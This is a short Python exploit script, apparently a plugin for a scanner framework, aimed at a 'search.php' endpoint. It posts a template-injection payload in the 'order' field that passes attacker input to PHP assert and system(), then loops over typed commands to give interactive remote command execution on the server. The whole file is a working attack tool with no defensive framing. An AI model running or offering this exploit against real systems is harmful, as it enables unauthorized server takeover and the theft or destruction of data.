from lib.core.data import target
import requests
import re

def poc():
	try:
		if  not target.url.endswith("search.php"):
			print("[*] Please make sure the url end with 'search.php'")
			exit()

		flag = 1
		while flag:
			try:
				command = raw_input("[*] input the command:")
				payload= 'system("%s")' % command
				if command != "exit":
					postdata = {
						"searchtype":"5",
						"searchword":"d",
						"order":"}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}",
						"func":"assert",
						"cmd": payload,
					}
					r = requests.post(target.url,data=postdata)
					print r.text[:r.text.find("<!DOCTYPE html>")].encode(r.encoding)
				else:
					flag = 0
			except EOFError as e:
				print "[*] type 'exit' to quit"
				pass
	except KeyError as e:
		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
